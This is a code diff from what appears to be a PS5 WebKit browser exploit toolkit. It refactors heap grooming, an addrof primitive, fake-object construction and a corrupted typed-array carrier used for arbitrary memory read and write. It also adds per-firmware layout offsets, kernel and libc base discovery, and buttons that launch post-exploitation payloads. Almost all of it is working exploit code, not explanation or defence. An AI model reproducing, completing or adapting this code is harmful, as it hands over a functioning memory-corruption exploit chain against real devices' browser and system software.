+    postActionsNode.style.opacity = "1";
+    postActionsNode.style.pointerEvents = interactive ? "auto" : "none";
+    postActionsNode.removeAttribute("aria-hidden");
+}
+
+function primePostExploitActions() {
+    if (postActionSurfacePrimed) return;
+    const registered = typeof Slopkit.PostActions?.all === "function"
+        ? Slopkit.PostActions.all().slice().sort((left, right) =>
+            left.order - right.order) : [];
+    const descriptors = armed ? registered.filter((action) =>
+        Slopkit.PostActions.supportsFirmware(action.id, FW_LABEL)) : registered;
+    if (descriptors.length > postActionSlots.length)
+        throw new Error("post-action control pool is too small");
+    for (let index = 0; index < postActionSlots.length; ++index) {
+        const slot = postActionSlots[index];
+        const descriptor = descriptors[index];
+        slot.control.addEventListener("click", activatePostAction);
+        setPostActionEnabled(slot.control, false);
+        const shouldHide = !descriptor;
+        if (slot.item.hidden !== shouldHide) slot.item.hidden = shouldHide;
+        if (!descriptor) {
+            slot.control.removeAttribute("data-action-id");
+            continue;
+        }
+        const actionName = t(descriptor.titleKey);
+        if (slot.control.dataset.actionId !== descriptor.id)
+            slot.control.dataset.actionId = descriptor.id;
+        setNodeText(slot.control, t(descriptor.readyKey
+            || "runtime.payload.launchAction", { action: actionName }));
+    }
+    // Keep the parsed controls in a nearly transparent paint layer during an
+    // armed run. Old PS5 WebKit can hit-test controls created or first painted
+    // after exploitation while failing to raster their backgrounds and text.
+    // Do not force layout or yield here: exploit preload must retain its
+    // original timing.
+    if (descriptors.length === 0 || (!armed && !POST_ACTION_PREVIEW)) {
+        stagePostActionSurface();
+        postActionsNode.hidden = true;
+    } else if (POST_ACTION_PREVIEW) {
+        revealPostActionSurface(false);
+    } else {
+        postActionsNode.hidden = false;
+        stagePostActionSurface();
+    }
+    postActionSurfacePrimed = true;
+}
+
+function cancelPostActionReveal() {
+    if (postActionRevealTimer === null) return;
+    clearTimeout(postActionRevealTimer);
+    postActionRevealTimer = null;
+}
+
+function schedulePostActionReveal() {
+    if (POST_ACTION_PREVIEW || postActionRevealTimer !== null
+            || postActionSurfaceVisible || postActionModel.length === 0)
+        return;
+    postActionRevealTimer = setTimeout(function () {
+        postActionRevealTimer = null;
+        if (postActionModel.length > 0) revealPostActionSurface(true);
+    }, POST_ACTION_REVEAL_DELAY_MS);
+}
+
+function showPostExploitActions(model) {
+    postActionModel = Array.isArray(model?.actions)
+        ? model.actions.slice().sort((left, right) => left.order - right.order)
+        : [];
+    if (postActionModel.length > postActionSlots.length)
+        postActionModel = postActionModel.slice(0, postActionSlots.length);
+    postActionNotice = model?.notice || null;
+    showPostActionNotice(postActionNotice);
+    const serializedBusy = payloadActionBusy || postActionModel.some(
+        (action) => action.state === "sending");
+    for (let index = 0; index < postActionSlots.length; ++index) {
+        const slot = postActionSlots[index];
+        const action = postActionModel[index];
+        const control = slot.control;
+        if (!action) {
+            if (!slot.item.hidden) slot.item.hidden = true;
+            setPostActionEnabled(control, false);
+            if (control.hasAttribute("aria-busy"))
+                control.removeAttribute("aria-busy");
+            continue;
+        }
+        if (slot.item.hidden) slot.item.hidden = false;
+        if (control.className !== "button primary post-action post-action-primary")
+            control.className = "button primary post-action post-action-primary";
+        if (control.dataset.actionId !== action.id)
+            control.dataset.actionId = action.id;
+        if (control.hasAttribute("aria-busy"))
+            control.removeAttribute("aria-busy");
+        const actionName = action.label || t(action.titleKey);
+        if (action.state === "sending") {
+            setNodeText(control, t(action.sendingKey
+                || "runtime.payload.launching"));
+            setPostActionEnabled(control, false);
+            control.setAttribute("aria-busy", "true");
+        } else if (action.state === "sent") {
+            setNodeText(control,
+                t(action.sentKey || "runtime.payload.sent", {
+                    action: actionName
+                }));
+            setPostActionEnabled(control, false);
+            control.classList.add("done");
+        } else if (action.state === "unavailable") {
+            setNodeText(control, t(action.unavailableKey
+                || "runtime.payload.unavailable"));
+            setPostActionEnabled(control, false);
+            control.classList.add("unavailable");
+        } else {
+            setNodeText(control, action.state === "failed"
+                ? t(action.retryKey || "runtime.payload.retry")
+                : t(action.readyKey || "runtime.payload.launchAction", {
+                    action: actionName
+                }));
+            setPostActionEnabled(control, !serializedBusy
+                && typeof action.launch === "function");
+            if (action.state === "failed") control.classList.add("failed");
+        }
+    }
+    if (postActionModel.length === 0) {
+        cancelPostActionReveal();
+        stagePostActionSurface();
+        postActionsNode.hidden = true;
+    } else if (POST_ACTION_PREVIEW) {
+        revealPostActionSurface(false);
+    } else {
+        schedulePostActionReveal();
+    }
+}
+
+async function runPostAction(action) {
+    if (typeof action?.launch !== "function" || payloadActionBusy) return;
+    payloadActionBusy = true;
+    for (const slot of postActionSlots)
+        setPostActionEnabled(slot.control, false);
+    postActionNotice = null;
+    setStageBanner(t(action.stageKey
+        || "runtime.stage.startingAutoloader"), "");
+    showStatus("", "run");
+    try {
+        await action.launch();
+    } catch (error) {
+        mark(action.progressPrefix === "REQUESTED-ACTION"
+            ? "REQUESTED-ACTION-FAILED" : "FAILED-PAYLOAD-ACTION", action.id);
+    } finally {
+        payloadActionBusy = false;
+        showPostExploitActions({
+            actions: postActionModel,
+            notice: postActionNotice
+        });
+    }
+}
+
+function hardStop(reason, recoveryDisposition) {
+    const disposition = recoveryDisposition === "dirty-cold-power-cycle"
+        ? recoveryDisposition : "safe-normal-reboot";
+    const recoveryKey = disposition === "dirty-cold-power-cycle"
+        ? "runtime.status.coldPower" : "runtime.status.reboot";
+    const recoveryText = t(recoveryKey);
+    mark("HARD-STOP", reason || "validation-failed");
+    mark(disposition === "dirty-cold-power-cycle"
+        ? "POWER-OFF-REQUIRED" : "REBOOT-REQUIRED", recoveryText);
+    try {
+        Slopkit.Attempts?.finish(Q.get("arm"), {
+            outcome: "failure",
+            terminalStage: runtimeStarted ? "runtime" : "renderer",
+            rebootRequired: true,
+            recoveryDisposition: disposition,
+            stages: rendererAttemptStarted ? ["renderer"] : []
+        });
+    } catch {}
     stopped = true;
-    catState("ok");
-    setCaption(`PoC PS5 FW ${FW_LABEL} - NOTIFICATION SENT`);
-    showStatus(`SUCCESS  (attempt ${attemptNumber})`, "ok");
-    screenLine("");
-    screenLine(`*** SUCCESS *** ${detail}`);
+    retryScheduled = false;
+    if (armed) {
+        try { sessionStorage.setItem(blockKey, "1"); } catch {}
+    }
+    catState("bad");
+    cancelPostActionReveal();
+    stagePostActionSurface();
+    postActionsNode.hidden = true;
+    setCaption(t("runtime.caption", { firmware: FW_LABEL }));
+    setStageBanner(t(disposition === "dirty-cold-power-cycle"
+        ? "runtime.stage.powerOff" : "runtime.stage.stopped"), "bad");
+    showStatus(recoveryText, "bad");
 }
 
-function hex(value) {
-    return `0x${value.toString(16)}`;
+function failed(reason) {
+    const candidateStateSafe = !candidateEverReturned
+        || (zeroHeaderMiss && !candidateMutationStarted);
+    if (retrySafe && candidateStateSafe && !candidateMutationStarted
+        && !carrierReady && !runtimeStarted)
+        releaseSafeAttemptMemory();
+    hardStop(reason || "single attempt failed");
 }
 
 function buffer(size) {
@@ -427,6 +858,20 @@ function uint32At(bytes, offset) {
         + bytes[offset + 1] * 0x100
         + bytes[offset + 2] * 0x10000
         + bytes[offset + 3] * 0x1000000;
+}
+
+function smallUnsignedAt(bytes, offset, width) {
+    if (width !== 1 && width !== 4 && width !== 8)
+        return NaN;
+    let value = bytes[offset];
+    if (width >= 4) {
+        value += bytes[offset + 1] * 0x100
+            + bytes[offset + 2] * 0x10000
+            + bytes[offset + 3] * 0x1000000;
+    }
+    if (width === 8 && !allZero(bytes, offset + 4, offset + 8))
+        return NaN;
+    return value;
 }
 
 function low48At(bytes, offset) {
@@ -476,17 +921,29 @@ function readTwiceMatches(destination, source, count) {
     return sameBytes(destination, source, count);
 }
 
+// Accept only identical, allocation-free collator snapshot pairs.
+function readStableCollatorSnapshot(source) {
+    for (let round = 1; round <= COLLATOR_STABLE_READ_ROUNDS; ++round) {
+        readBytes(collatorHeader, source, COLLATOR_BYTES);
+        readBytes(collatorHeaderRepeat, source, COLLATOR_BYTES);
+        if (sameBytes(collatorHeader, collatorHeaderRepeat, COLLATOR_BYTES))
+            return true;
+    }
+    return false;
+}
+
 function aimCarrier(candidate, address) {
     const high = Math.floor(address / 0x100000000);
     scratchWords[0] = address - high * 0x100000000;
     scratchWords[1] = high;
     for (let i = 0; i < 8; ++i)
-        candidate[0x10 + i] = scratchBytes[i];
+        candidate[RENDERER_LAYOUT.vectorOffset + i] = scratchBytes[i];
 }
 
 function restoreCarrier(candidate) {
     for (let i = 0; i < 8; ++i)
-        candidate[0x10 + i] = rwHeader[0x10 + i];
+        candidate[RENDERER_LAYOUT.vectorOffset + i]
+            = rwHeader[RENDERER_LAYOUT.vectorOffset + i];
 }
 
 function pointerFromWords(words, offset) {
@@ -520,44 +977,16 @@ function inPS5UserModuleBand(value) {
     return value >= 0x800000000 && value < 0x900000000;
 }
 
-function classifyImportedFunction(value, exportOffset, providerTextSize) {
-    if (value === 0)
-        return 3;
-    if (value >= webkitBase && value < webkitBase + WEBKIT_TEXT_SIZE)
-        return 2;
-    const providerBase = value - exportOffset;
-    if (inPS5UserModuleBand(providerBase)
-        && providerBase % 0x4000 === 0
-        && providerBase !== webkitBase
-        && value >= providerBase
-        && value < providerBase + providerTextSize)
-        return 1;
-    return 0;
-}
-
-function importStatusName(status) {
-    if (status === 1)
-        return "RESOLVED";
-    if (status === 2)
-        return "UNRESOLVED";
-    if (status === 3)
-        return "NULL";
-    return "OTHER";
-}
-
-function dumpHex(bytes, count) {
-    let out = "";
-    for (let i = 0; i < count; ++i)
-        out += bytes[i].toString(16).padStart(2, "0");
-    return out;
-}
-
 function encodedHeaderNumber() {
     const raw = new ArrayBuffer(8);
     const u32 = new Uint32Array(raw);
     const f64 = new Float64Array(raw);
-    u32[0] = 0x00004250;
-    u32[1] = 0x01062800;
+    const uint8 = RENDERER_OBJECTS.uint8Array;
+    const targetHigh = RENDERER_BOOTSTRAP.indexingType
+        + uint8.cellType * 0x100 + uint8.typeFlags * 0x10000
+        + RENDERER_BOOTSTRAP.cellState * 0x1000000;
+    u32[0] = RENDERER_BOOTSTRAP.uint8ArrayStructureId;
+    u32[1] = targetHigh - RENDERER_ENCODING.jsValueDoubleEncodeHigh32;
     return f64[0];
 }
 
@@ -566,66 +995,70 @@ function scheduleSafeRetry(reason) {
         return;
     const candidateStateSafe = !candidateEverReturned
         || (zeroHeaderMiss && !candidateMutationStarted);
-    if (!autoMode || !retrySafe || !candidateStateSafe
-        || candidateMutationStarted || commitStarted
-        || carrierArmedForCommit || alreadyBlocked || !attemptPersisted) {
-        mark("AUTO-RETRY-NOT-SCHEDULED", `reason=${reason}`
-            + `-auto=${autoMode}-safe=${retrySafe}`
-            + `-candidate-seen=${candidateEverReturned}`
-            + `-candidate-mutated=${candidateMutationStarted}`
-            + `-candidate-state-safe=${candidateStateSafe}`
-            + `-commit=${commitStarted}-armed=${carrierArmedForCommit}`
-            + `-preblocked=${alreadyBlocked}`
-            + `-attempt-persisted=${attemptPersisted}`);
-        failed();
-        return;
-    }
-    if (MAX_ATTEMPTS && attemptNumber >= MAX_ATTEMPTS) {
-        mark("ATTEMPT-CEILING", `reason=${reason}-max=${MAX_ATTEMPTS}`);
-        failed();
-        return;
-    }
-
-    retryScheduled = true;
-    const nextAttempt = attemptNumber + 1;
-    mark("AUTO-RETRY-SCHEDULED", `reason=${reason}`
-        + `-next-attempt=${nextAttempt}`
-        + `-delay-ms=${AUTO_RETRY_DELAY_MS}`);
-    setTimeout(() => {
-        let storageStillSafe = false;
-        const candidateStillSafe = !candidateEverReturned
-            || (zeroHeaderMiss && !candidateMutationStarted);
-        try {
-            storageStillSafe = sessionStorage.getItem(passKey) === null
-                && sessionStorage.getItem(blockKey) === null;
-        } catch {}
-        if (!storageStillSafe || !retrySafe || !candidateStillSafe
-            || candidateMutationStarted || commitStarted
-            || carrierArmedForCommit || stopped) {
-            mark("AUTO-RETRY-CANCELLED", `reason=${reason}`
-                + `-storage-safe=${storageStillSafe}`
-                + `-retry-safe=${retrySafe}`
-                + `-candidate-safe=${candidateStillSafe}`
-                + `-candidate-mutated=${candidateMutationStarted}`
-                + `-commit=${commitStarted}`
-                + `-armed=${carrierArmedForCommit}`);
-            failed();
-            return;
-        }
-
-        attemptNumber = nextAttempt;
-        startAttempt();
-    }, AUTO_RETRY_DELAY_MS);
+    if (retrySafe && candidateStateSafe && !candidateMutationStarted
+        && !carrierReady && !runtimeStarted)
+        releaseSafeAttemptMemory();
+    hardStop(`single attempt failed: ${reason}`);
 }
 
-function finishEarlySafeAttempt(tag, extra, reason) {
+function releaseSafeAttemptMemory() {
+    try { clearPredecessor(); } catch {}
+    try { history.replaceState(null, ""); } catch {}
+    predecessorWords = null;
+    keepAlive = null;
+    referenceTarget = null;
+    leakedScope = null;
+    getterCarrier = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    fillerGraph = null;
+    outerGraph = null;
+    fakeHost = null;
+    lengthWord = null;
+    targetHolder = null;
+    holderGuardA = null;
+    holderGuardB = null;
+    rwBuffer = null;
+    rwView = null;
+    rwMirror = null;
+    targetBuffer = null;
+    targetView = null;
+    arenaBuffer = null;
+    arenaView = null;
+    realCollator = null;
+    compareFn = null;
+}
+
+function releaseGroomingMemoryForRuntime() {
+    // Keep the corrupted carrier, rw view/backing, fake host, target holder,
+    // arena, collator and bound compare function rooted. Everything below was
+    // needed only to place and discover those objects.
+    try { clearPredecessor(); } catch {}
+    try { history.replaceState(null, ""); } catch {}
+    predecessorWords = null;
+    keepAlive = null;
+    referenceTarget = null;
+    leakedScope = null;
+    getterCarrier = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    fillerGraph = null;
+    outerGraph = null;
+    targetBuffer = null;
+    targetView = null;
+}
+
+function finishEarlySafeAttempt(reason) {
+    mark("EARLY-SAFE-FINISH", reason);
     retrySafe = true;
-    mark(tag, `${extra}-retry-safe=true-candidate-seen=false`
-        + "-candidate-mutated=false");
     scheduleSafeRetry(reason);
 }
 
 function resetAttemptState() {
+    persistentCarrier = null;
+    runtimeStarted = false;
     referenceTarget = null;
     rwBuffer = null;
     rwView = null;
@@ -638,9 +1071,6 @@ function resetAttemptState() {
     arenaView = null;
     realCollator = null;
     compareFn = null;
-    notificationRequest = "";
-    notificationRequestOK = false;
-    notificationPrewarmResult = 0;
     targetHolder = null;
     holderGuardA = null;
     holderGuardB = null;
@@ -653,14 +1083,11 @@ function resetAttemptState() {
     capturedWords = null;
     copiedLength = 0;
     captureState = 0;
-    captureError = null;
     hostAddress = NaN;
     fakeAddress = NaN;
-    predecessorWords = null;
-    keepAlive = new Array(DRAIN_COUNT + 3);
+    predecessorWords = [];
+    keepAlive = new Array(DRAIN_COUNT + PLACEMENT_PAIRS + 2);
     keepIndex = 0;
-    pointerLow = 0;
-    pointerHigh = 0;
     targetAddress = NaN;
     targetAddressLow = 0;
     targetAddressHigh = 0;
@@ -672,8 +1099,6 @@ function resetAttemptState() {
     rwHeaderOK = false;
     functionHeaderOK = false;
     nativeExecutableHeaderOK = false;
-    functionStructureID = 0;
-    nativeExecutableStructureID = 0;
     executableAddress = NaN;
     nativeFunctionAddress = NaN;
     nativeConstructorAddress = NaN;
@@ -686,40 +1111,11 @@ function resetAttemptState() {
     candidateEverReturned = false;
     candidateMutationStarted = false;
     zeroHeaderMiss = false;
-    gotReadAttempted = false;
-    gotWindowAddressesOK = false;
-    gotWindowsRepeated = false;
-    gotCanonicalOK = false;
     gotReadOK = false;
-    requirementsObjectA = 0;
-    requirementsObjectB = 0;
-    requirementsBase = NaN;
-    requirementsBaseOK = false;
-    kernelObjectPointer = 0;
-    kernelObjectBase = NaN;
-    kernelObjectBaseOK = false;
-    cxaFinalizePointer = 0;
-    strlenPointer = 0;
-    strerrorPointer = 0;
-    memchrPointer = 0;
-    closePointer = 0;
-    errorPointer = 0;
-    getpidPointer = 0;
-    pthreadGetspecificPointer = 0;
-    cxaFinalizeStatus = 0;
-    strlenStatus = 0;
-    strerrorStatus = 0;
-    memchrStatus = 0;
-    closeStatus = 0;
-    errorStatus = 0;
-    getpidStatus = 0;
-    pthreadGetspecificStatus = 0;
-    libcBase = NaN;
-    libcResolvedCount = 0;
-    libcBaseOK = false;
     kernelBase = NaN;
-    kernelResolvedCount = 0;
     kernelBaseOK = false;
+    libcBase = NaN;
+    libcBaseOK = false;
     holderHeaderOK = false;
     arenaViewHeaderOK = false;
     collatorHeaderOK = false;
@@ -733,13 +1129,11 @@ function resetAttemptState() {
     notifyAddressOK = false;
     arenaLayoutOK = false;
     arenaFilledOK = false;
-    carrierArmedForCommit = false;
-    notifyReady = false;
-    commitStarted = false;
-    commitBlockConfirmed = false;
+    carrierReady = false;
+    handoffReady = false;
+    attemptBlocked = false;
     compositionState = 0;
     compositionLength = 0;
-    compositionError = null;
     rwHeader.fill(0);
     targetHeader.fill(0);
     holderHeader.fill(0);
@@ -747,63 +1141,35 @@ function resetAttemptState() {
     collatorHeader.fill(0);
     compareFnHeader.fill(0);
     collatorOriginal.fill(0);
-    importWindowA1.fill(0);
-    importWindowA2.fill(0);
-    importWindowB1.fill(0);
-    importWindowB2.fill(0);
 }
 
 function startAttempt() {
     if (stopped)
         return;
-    resetAttemptState();
-    showStatus(`RUNNING  attempt ${attemptNumber}`, "run");
+    rendererAttemptStarted = true;
     try {
-        sessionStorage.setItem(attemptKey, String(attemptNumber));
-        attemptPersisted = sessionStorage.getItem(attemptKey)
-            === String(attemptNumber);
+        const qualification = preloadedProfile?.qualificationRecord?.() || {};
+        Slopkit.Attempts?.begin({
+            attemptId: Q.get("arm"),
+            exploit: SELECTED_EXPLOIT,
+            firmware: FW_LABEL,
+            profileRevision: qualification.profileRevision
+                || `offsets-v${preloadedProfile?.metadata?.schemaVersion || 0}`,
+            engineRevision: qualification.engineRevision || "current",
+            runtimeRevision: qualification.runtimeRevision
+                || RUNTIME_REVISION_FALLBACK,
+            mode: "default"
+        });
     } catch {}
-    mark("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
-        + `-auto=${autoMode}-hard-max=${MAX_ATTEMPTS || "none"}`
-        + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`
-        + `-retry-ms=${AUTO_RETRY_DELAY_MS}`);
+    mark("ATTEMPT-START");
+    resetAttemptState();
+    showStatus("", "run");
     try {
         buildAndStoreGraph();
         prepareAddrof();
-    } catch (error) {
-        finishEarlySafeAttempt("SETUP-THREW",
-            `${error?.name}:${String(error?.message).slice(0, 80)}`,
-            "setup-threw");
+    } catch {
+        finishEarlySafeAttempt("setup-threw");
     }
-}
-
-function buildNotificationRequest() {
-    const trailing = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET
-        - NOTIFICATION_MESSAGE.length;
-    if (trailing < 1)
-        throw new Error("notification-message-too-long");
-    notificationRequest = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET)
-        + NOTIFICATION_MESSAGE + "\x00".repeat(trailing);
-    notificationRequestOK = notificationRequest.length
-        === NOTIFICATION_REQUEST_SIZE;
-    for (let p = 0; p < NOTIFICATION_MESSAGE_OFFSET; ++p) {
-        if (notificationRequest.charCodeAt(p) !== 0)
-            notificationRequestOK = false;
-    }
-    for (let m = 0; m < NOTIFICATION_MESSAGE.length; ++m) {
-        const messageCode = notificationRequest.charCodeAt(
-            NOTIFICATION_MESSAGE_OFFSET + m);
-        if (messageCode !== NOTIFICATION_MESSAGE.charCodeAt(m)
-            || messageCode > 0x7f)
-            notificationRequestOK = false;
-    }
-    for (let t = NOTIFICATION_MESSAGE_OFFSET + NOTIFICATION_MESSAGE.length;
-        t < NOTIFICATION_REQUEST_SIZE; ++t) {
-        if (notificationRequest.charCodeAt(t) !== 0)
-            notificationRequestOK = false;
-    }
-    if (!notificationRequestOK)
-        throw new Error("notification-request-layout-failed");
 }
 
 function leakScopeObject() {
@@ -835,7 +1201,7 @@ function buildFakeHost() {
     rwMirror = new Uint8Array(rwBuffer);
     rwMirror[0] = 0x3c;
 
-    targetBuffer = new ArrayBuffer(0x20);
+    targetBuffer = new ArrayBuffer(FUNCTION_BYTES);
     targetView = new Uint8Array(targetBuffer);
     targetView[0] = 0xa5;
     lengthWord = { keep: 0x51515151 };
@@ -868,10 +1234,6 @@ function buildFakeHost() {
     compareFn = realCollator.compare;
     if (!(compareFn("a", "b") < 0))
         throw new Error("collator-prewarm-failed");
-    buildNotificationRequest();
-    notificationPrewarmResult = compareFn(notificationRequest, "b");
-    if (!Number.isFinite(notificationPrewarmResult))
-        throw new Error("notification-request-prewarm-failed");
     holderGuardA = { marker: 0x484f4c44 };
     holderGuardB = { marker: 0x47554152 };
     targetHolder = {
@@ -892,10 +1254,10 @@ function buildFakeHost() {
 }
 
 function buildAndStoreGraph() {
+    mark("SSV-BUILD");
     referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
     buildFakeHost();
 
-    mark("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
     fillerGraph = new Array(0xfffd);
     let pos = 0;
     const huge = 1n << 40n;
@@ -909,28 +1271,24 @@ function buildAndStoreGraph() {
     outerGraph[1] = referenceTarget;
     outerGraph[2] = referenceTarget;
     outerGraph[CONTROL_INDEX] = CONTROL_INT;
-    mark("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
 
-    mark("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
     history.replaceState(outerGraph, "");
-    mark("SSV-STORED", "fake-host-and-rop-holder-not-serialized");
+    mark("SSV-STORED");
 }
 
 function prepareAddrof() {
+    mark("ADDROF-PREP-BEGIN");
     capturedWords = new Uint16Array(16);
     getterCarrier = function getterCarrierFunction() { return 7; };
 
-    mark("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
     getterCarrier[0] = fakeHost;
     for (let i = 1; i < CARRIER_SLOTS; i++)
         getterCarrier[i] = 0;
     getterCarrier[1] = targetHolder;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetHolder;
-    mark("ADDROF-CARRIER-DONE", "host-holder-host-holder");
 
     preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
-    mark("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
 
     setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
     setTimeout(beginComposition, COMPOSE_DELAY_MS);
@@ -943,15 +1301,14 @@ function runAddrofCapture() {
         for (let i = 0; i < 16; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
         captureState = 1;
-    } catch (error) {
-        captureError = error;
+    } catch {
         captureState = -1;
     }
 }
 
 function fillRawCellPointers(backing, pointer) {
-    pointerHigh = Math.floor(pointer / 0x100000000);
-    pointerLow = pointer - pointerHigh * 0x100000000;
+    const pointerHigh = Math.floor(pointer / 0x100000000);
+    const pointerLow = pointer - pointerHigh * 0x100000000;
 
     if (!plausibleCell(pointer)
         || pointerHigh < 0 || pointerHigh > 0xffff
@@ -960,23 +1317,22 @@ function fillRawCellPointers(backing, pointer) {
         || pointerLow + pointerHigh * 0x100000000 !== pointer)
         throw new Error("invalid-low48-fake-address");
 
-    predecessorWords = new Uint32Array(backing);
-    for (let i = 0; i < predecessorWords.length; i += 2) {
-        predecessorWords[i] = pointerLow;
-        predecessorWords[i + 1] = pointerHigh;
+    const words = new Uint32Array(backing);
+    predecessorWords.push(words);
+    for (let i = 0; i < words.length; i += 2) {
+        words[i] = pointerLow;
+        words[i + 1] = pointerHigh;
     }
 
-    const last = predecessorWords.length - 2;
-    if (predecessorWords[0] !== pointerLow
-        || predecessorWords[1] !== pointerHigh
-        || predecessorWords[last] !== pointerLow
-        || predecessorWords[last + 1] !== pointerHigh)
+    const last = words.length - 2;
+    if (words[0] !== pointerLow || words[1] !== pointerHigh
+        || words[last] !== pointerLow || words[last + 1] !== pointerHigh)
         throw new Error("pointer-fill-verification-failed");
 }
 
 function clearPredecessor() {
     if (predecessorWords !== null)
-        predecessorWords.fill(0);
+        for (const words of predecessorWords) words.fill(0);
 }
 
 function loadHistoryCritical() {
@@ -1017,24 +1373,29 @@ function loadHistoryCritical() {
 
         const rwSID = uint32At(rwHeader, 0);
         const rwHeaderHigh = uint32At(rwHeader, 4);
-        const rwButterfly = low48At(rwHeader, 8);
-        rwOriginalVector = low48At(rwHeader, 0x10);
-
-        const rwOffsetZero = allZero(rwHeader, 0x20, 0x28);
+        const rwButterfly = low48At(rwHeader,
+            RENDERER_LAYOUT.butterflyOffset);
+        rwOriginalVector = low48At(rwHeader, RENDERER_LAYOUT.vectorOffset);
+        const rwLength = smallUnsignedAt(rwHeader,
+            RENDERER_LAYOUT.lengthOffset, RENDERER_LAYOUT.lengthBytes);
+        const rwOffsetZero = RENDERER_LAYOUT.byteOffsetOffset === null
+            || smallUnsignedAt(rwHeader, RENDERER_LAYOUT.byteOffsetOffset,
+                RENDERER_LAYOUT.byteOffsetBytes) === 0;
+        const rwMode = smallUnsignedAt(rwHeader, RENDERER_LAYOUT.modeOffset,
+            RENDERER_LAYOUT.modeBytes);
+        const uint8Contract = RENDERER_OBJECTS.uint8Array;
         rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
             && (rwSID & 0xf) === 0
-            && rwHeader[4] === 0 && rwHeader[5] === 0x28
-            && rwHeader[6] === 0x08
-            && (rwHeader[7] === 0 || rwHeader[7] === 1)
-            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
+            && rwHeader[4] === RENDERER_BOOTSTRAP.indexingType
+            && rwHeader[5] === uint8Contract.cellType
+            && rwHeader[6] === uint8Contract.typeFlags
+            && (rwHeader[7] <= 1  || rwHeader[7] === 2)
+            && canonicalLow48(rwHeader, RENDERER_LAYOUT.butterflyOffset)
             && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
-            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
+            && canonicalLow48(rwHeader, RENDERER_LAYOUT.vectorOffset)
             && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
-            && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
-            && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
-            && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
-            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
-            && rwOffsetZero && rwHeader[0x28] === 0x58;
+            && rwLength === rwBuffer.byteLength && rwOffsetZero
+            && rwMode === RENDERER_LAYOUT.modeValue;
 
         if (!rwHeaderOK) {
             zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
@@ -1047,7 +1408,8 @@ function loadHistoryCritical() {
         }
 
         scratchWords[0] = rwSID;
-        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
+        scratchWords[1] = (rwHeaderHigh
+            - RENDERER_ENCODING.jsValueDoubleEncodeHigh32) >>> 0;
         const upgradedHeader = scratchDouble[0];
         const upgradedFinite = upgradedHeader === upgradedHeader
             && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
@@ -1072,19 +1434,25 @@ function loadHistoryCritical() {
         const holderRepeated = readTwiceMatches(holderHeader, rwView,
             HOLDER_BYTES);
         const holderSID = uint32At(holderHeader, 0);
-        const holderButterflyZero = allZero(holderHeader, 0x08, 0x10);
-        nativeTargetAddress = low48At(holderHeader, 0x10);
-        arenaViewAddress = low48At(holderHeader, 0x18);
-        realCollatorAddress = low48At(holderHeader, 0x20);
-        compareFnAddress = low48At(holderHeader, 0x28);
-        const holderGuardAAddress = low48At(holderHeader, 0x30);
-        const holderGuardBAddress = low48At(holderHeader, 0x38);
+        const plainContract = RENDERER_OBJECTS.plainObject;
+        const inlineOffset = plainContract.inlineStorageOffset;
+        const holderButterflyZero = allZero(holderHeader,
+            plainContract.butterflyOffset, inlineOffset);
+        nativeTargetAddress = low48At(holderHeader, inlineOffset);
+        arenaViewAddress = low48At(holderHeader, inlineOffset + 0x08);
+        realCollatorAddress = low48At(holderHeader, inlineOffset + 0x10);
+        compareFnAddress = low48At(holderHeader, inlineOffset + 0x18);
+        const holderGuardAAddress = low48At(holderHeader,
+            inlineOffset + 0x20);
+        const holderGuardBAddress = low48At(holderHeader,
+            inlineOffset + 0x28);
         holderHeaderOK = holderRepeated
             && holderSID >= 0x4000 && holderSID < 0x08000000
             && (holderSID & 0xf) === 0 && targetAddress % 0x10 === 0
-            && holderHeader[4] === 0 && holderHeader[5] === 0x18
-            && holderHeader[6] === 0
-            && (holderHeader[7] === 0 || holderHeader[7] === 1)
+            && holderHeader[4] === RENDERER_BOOTSTRAP.indexingType
+            && holderHeader[5] === plainContract.cellType
+            && holderHeader[6] === plainContract.typeFlags
+            && (holderHeader[7] <= 1  || holderHeader[7] === 2)
             && holderButterflyZero
             && plausibleCell(nativeTargetAddress)
             && plausibleCell(arenaViewAddress)
@@ -1092,12 +1460,12 @@ function loadHistoryCritical() {
             && plausibleCell(compareFnAddress)
             && plausibleCell(holderGuardAAddress)
             && plausibleCell(holderGuardBAddress)
-            && canonicalLow48(holderHeader, 0x10)
-            && canonicalLow48(holderHeader, 0x18)
-            && canonicalLow48(holderHeader, 0x20)
-            && canonicalLow48(holderHeader, 0x28)
-            && canonicalLow48(holderHeader, 0x30)
-            && canonicalLow48(holderHeader, 0x38)
+            && canonicalLow48(holderHeader, inlineOffset)
+            && canonicalLow48(holderHeader, inlineOffset + 0x08)
+            && canonicalLow48(holderHeader, inlineOffset + 0x10)
+            && canonicalLow48(holderHeader, inlineOffset + 0x18)
+            && canonicalLow48(holderHeader, inlineOffset + 0x20)
+            && canonicalLow48(holderHeader, inlineOffset + 0x28)
             && nativeTargetAddress !== arenaViewAddress
             && nativeTargetAddress !== realCollatorAddress
